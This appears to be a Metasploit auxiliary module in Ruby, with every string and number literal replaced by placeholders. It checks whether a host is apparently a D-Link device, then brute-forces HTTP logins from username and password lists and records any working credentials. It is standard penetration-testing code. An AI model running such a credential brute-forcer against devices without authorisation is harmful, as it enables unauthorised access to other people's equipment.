require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: AuthBrute include Msf :: Auxiliary :: Scanner def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] ] , <str> = > MSF_LICENSE ) register_options ( [ OptString . new ( <str> , [ false , <str> , <str> ] ) , OptPath . new ( <str> , [ false , <str> , File . join ( Msf :: Config . data_directory , <str> , <str> ) ] ) , ] , self . class ) end def target_url proto = <str> if rport == <int> or ssl proto = <str> end <str> proto <str> rhost <str> rport <str> @uri . to_s <str> end def is_dlink? response = send_request_cgi ( { <str> = > @uri , <str> = > <str> } ) if response and response . headers [ <str> ] and response . headers [ <str> ] =~ <str> return true else return false end end def run_host ( ip ) @uri = <str> if is_dlink? vprint_good ( <str> target_url <str> ) else vprint_error ( <str> target_url <str> ) return end print_status ( <str> target_url <str> ) each_user_pass { | user , pass | do_login ( user , pass ) } end def report_cred ( opts ) service_data = { <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : ( ssl ? <str> : <str> ) , <str> : <str> , <str> : myworkspace_id } credential_data = { <str> : <str> , <str> : fullname , <str> : opts [ <str> ] , <str> : opts [ <str> ] , <str> : <str> } . merge ( service_data ) login_data = { <str> : DateTime . now , <str> : create_credential ( credential_data ) , <str> : Metasploit :: Model :: Login :: Status :: SUCCESSFUL , <str> : opts [ <str> ] } . merge ( service_data ) create_credential_login ( login_data ) end def do_login ( user = <str> , pass = <str> ) vprint_status ( <str> target_url <str> user <str> pass <str> ) response = do_http_login ( user , pass ) result = determine_result ( response ) if result == <str> print_good ( <str> target_url <str> user <str> pass <str> ) report_cred ( <str> : rhost , <str> : rport , <str> : user , <str> : pass , <str> : response . inspect ) return <str> else vprint_error ( <str> target_url <str> user <str> ) return end end def do_http_login ( user , pass ) begin response = send_request_cgi ( { <str> = > @uri , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > user , <str> = > pass , <str> = > <str> } } ) return nil if response . nil? return nil if ( response . code == <int> ) return response rescue :: Rex :: ConnectionError vprint_error ( <str> target_url <str> ) return nil end end def determine_result ( response ) return <str> if response . nil? return <str> unless response . kind_of? Rex :: Proto :: Http :: Response return <str> unless response . code if response . body =~ <str> return <str> end return <str> end end 
